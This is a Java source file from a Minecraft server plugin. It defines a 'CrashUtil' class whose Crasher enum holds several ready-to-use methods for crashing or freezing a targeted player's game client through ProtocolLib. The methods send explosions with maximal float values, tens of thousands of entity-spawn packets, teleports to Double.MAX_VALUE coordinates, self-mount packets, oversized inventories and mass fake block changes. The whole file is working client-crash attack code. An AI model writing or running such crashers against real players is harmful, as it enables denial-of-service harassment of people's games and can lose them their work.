package cc.i9mc.gameutils.utils;

import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.events.PacketContainer;
import com.comphenix.protocol.injector.PacketConstructor;
import com.comphenix.protocol.utility.MinecraftVersion;
import org.bukkit.Bukkit;
import org.bukkit.EntityEffect;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Arrow;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.UUID;

public class CrashUtil {
    public enum Crasher {
        FULL() {
            @Override
            public boolean crashInternal(Player player) {
                boolean bl = false;
                for (Crasher crasher : values()) {
                    if (crasher.name().equals("FULL") || crasher.name().equals("FAKE_DEATH")) {
                        continue;
                    }

                    try {
                        if (!crasher.crash(player)) {
                            continue;
                        }
                        bl = true;
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                return bl;
            }
        },
        EXPLODE_POWERFUL() {
            @Override
            public boolean crashInternal(Player player) {
                PacketContainer packetContainer = new PacketContainer(PacketType.Play.Server.EXPLOSION);
                Location location = player.getLocation();
                packetContainer.getDoubles().write(0, location.getX());
                packetContainer.getDoubles().write(1, location.getY());
                packetContainer.getDoubles().write(2, location.getZ());
                packetContainer.getFloat().write(0, Float.MAX_VALUE);
                packetContainer.getSpecificModifier(List.class).write(0, new ArrayList(0));
                packetContainer.getFloat().write(1, Float.MAX_VALUE);
                packetContainer.getFloat().write(2, Float.MAX_VALUE);
                packetContainer.getFloat().write(3, Float.MAX_VALUE);
                try {
                    for (int i = 0; i < 60; ++i) {
                        ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, false);
                    }
                } catch (Exception e) {
                    return false;
                }
                return true;
            }
        },
        EXPLODE_BYPASS {
            @Override
            public boolean crashInternal(Player player) {
                PacketContainer packetContainer = new PacketContainer(PacketType.Play.Server.EXPLOSION);
                Location location = player.getLocation();
                packetContainer.getDoubles().write(0, location.getX());
                packetContainer.getDoubles().write(1, location.getY());
                packetContainer.getDoubles().write(2, location.getZ());
                packetContainer.getFloat().write(0, 500.0f);
                packetContainer.getSpecificModifier(List.class).write(0, new ArrayList(0));
                packetContainer.getFloat().write(1, 500.0f);
                packetContainer.getFloat().write(2, 500.0f);
                packetContainer.getFloat().write(3, 500.0f);
                try {
                    for (int i = 0; i < 150; ++i) {
                        ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, false);
                    }
                } catch (Exception e) {
                    return false;
                }
                return true;
            }
        },
        ENTITY_SPAM {
            @Override
            public boolean crashInternal(Player player) {
                Arrow arrow = player.launchProjectile(Arrow.class);
                PacketConstructor packetConstructor = ProtocolLibrary.getProtocolManager().createPacketConstructor(PacketType.Play.Server.SPAWN_ENTITY, arrow, 60, 0);
                PacketContainer packetContainer = packetConstructor.createPacket(arrow, 60, 0);
                arrow.remove();
                try {
                    for (int i = 0; i < 50000; ++i) {
                        UUID uUID = UUID.randomUUID();
                        if (ProtocolLibrary.getProtocolManager().getMinecraftVersion().isAtLeast(MinecraftVersion.COMBAT_UPDATE)) {
                            packetContainer.getUUIDs().write(0, uUID);
                        }
                        packetContainer.getIntegers().write(0, uUID.hashCode());
                        ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, false);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    return false;
                }
                return true;
            }
        },
        ILLEGAL_POSITION {
            @Override
            public boolean crashInternal(Player player) {
                if (!ProtocolLibrary.getProtocolManager().getMinecraftVersion().isAtLeast(MinecraftVersion.COMBAT_UPDATE)) {
                    return false;
                }
                PacketContainer packetContainer = ProtocolLibrary.getProtocolManager().createPacket(PacketType.Play.Server.ENTITY_TELEPORT);
                packetContainer.getModifier().writeDefaults();
                packetContainer.getIntegers().write(0, player.getEntityId());
                packetContainer.getDoubles().write(0, Double.MAX_VALUE);
                packetContainer.getDoubles().write(1, Double.MAX_VALUE);
                packetContainer.getDoubles().write(2, Double.MAX_VALUE);
                packetContainer.getIntegers().write(0, 0);
                packetContainer.getIntegers().write(1, 0);
                packetContainer.getBooleans().write(0, true);
                try {
                    ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, false);
                } catch (Exception e) {
                    return false;
                }

                return true;
            }
        },
        SELF_MOUNT {
            @Override
            public boolean crashInternal(Player player) {
                if (ProtocolLibrary.getProtocolManager().getMinecraftVersion().isAtLeast(MinecraftVersion.COMBAT_UPDATE)) {
                    PacketContainer packetContainer = ProtocolLibrary.getProtocolManager().createPacket(PacketType.Play.Server.MOUNT);
                    packetContainer.getModifier().writeDefaults();
                    packetContainer.getIntegers().write(0, player.getEntityId());
                    packetContainer.getIntegerArrays().write(0, new int[]{player.getEntityId()});
                    PacketContainer packetContainer2 = ProtocolLibrary.getProtocolManager().createPacket(PacketType.Play.Server.MOUNT);
                    packetContainer2.getModifier().writeDefaults();
                    packetContainer2.getIntegers().write(0, player.getEntityId());
                    packetContainer2.getIntegerArrays().write(0, new int[0]);
                    try {
                        ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, false);
                        ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer2, false);
                    } catch (Exception e) {
                        return false;
                    }
                    return true;
                }

                PacketContainer packetContainer = ProtocolLibrary.getProtocolManager().createPacket(PacketType.Play.Server.ATTACH_ENTITY);
                packetContainer.getModifier().writeDefaults();
                packetContainer.getIntegers().write(0, player.getEntityId());
                packetContainer.getIntegers().write(1, player.getEntityId());
                PacketContainer packetContainer3 = ProtocolLibrary.getProtocolManager().createPacket(PacketType.Play.Server.ATTACH_ENTITY);
                packetContainer3.getModifier().writeDefaults();
                packetContainer.getIntegers().write(0, -1);
                try {
                    ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, false);
                    ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer3, false);
                } catch (Exception e) {
                    return false;
                }
                return true;
            }
        },
        LARGE_INVENTORY {
            @Override
            public boolean crashInternal(Player player) {
                player.openInventory(Bukkit.createInventory(player, 666));
                return true;
            }
        },
        FRAME_LAG {
            @Override
            public boolean crashInternal(Player player) {
                Location location = player.getLocation();
                for (int i = 0; i < 65; ++i) {
                    for (int j = 0; j < 65; ++j) {
                        for (int k = 4; k < 9; ++k) {
                            player.sendBlockChange(location.clone().add(-32.0, 0.0, -32.0).add(i, k, j), Material.ENDER_PORTAL, (byte) 0);
                        }
                    }
                }
                return true;
            }
        },
        FRAME_FREEZE {
            @Override
            public boolean crashInternal(Player player) {
                Location location = player.getLocation();
                for (int i = 0; i < 65; ++i) {
                    for (int j = 0; j < 65; ++j) {
                        for (int k = 4; k < 24; ++k) {
                            player.sendBlockChange(location.clone().add(-32.0, 0.0, -32.0).add(i, k, j), Material.ENDER_PORTAL, (byte) 0);
                        }
                    }
                }
                return true;
            }
        },
        VELOCITY {
            @Override
            public boolean crashInternal(Player player) {
                PacketContainer packetContainer = ProtocolLibrary.getProtocolManager().createPacket(PacketType.Play.Server.ENTITY_VELOCITY);
                packetContainer.getModifier().writeDefaults();
                packetContainer.getIntegers().write(0, player.getEntityId());
                packetContainer.getIntegers().write(1, Integer.MAX_VALUE);
                packetContainer.getIntegers().write(2, Integer.MAX_VALUE);
                packetContainer.getIntegers().write(3, Integer.MAX_VALUE);
                try {
                    ProtocolLibrary.getProtocolManager().sendServerPacket(player, packetContainer, false);
                } catch (Exception e) {
                    return false;
                }
                return true;
            }
        },
        FAKE_DEATH {
            @Override
            public boolean crashInternal(Player player) {
                player.playEffect(EntityEffect.DEATH);
                return true;
            }
        };

        public static Crasher matchCrasher(String string) {
            ArrayList<Crasher> arrayList = new ArrayList<>();
            string = string.toUpperCase(Locale.ENGLISH);
            for (Crasher crasher : Crasher.values()) {
                if (!crasher.name().toUpperCase(Locale.ENGLISH).contains(string)) continue;
                arrayList.add(crasher);
            }
            if (arrayList.size() == 1) {
                return arrayList.get(0);
            }

            return null;
        }

        public boolean crash(Player player) {
            return crashInternal(player);
        }

        public abstract boolean crashInternal(Player player);
    }

}
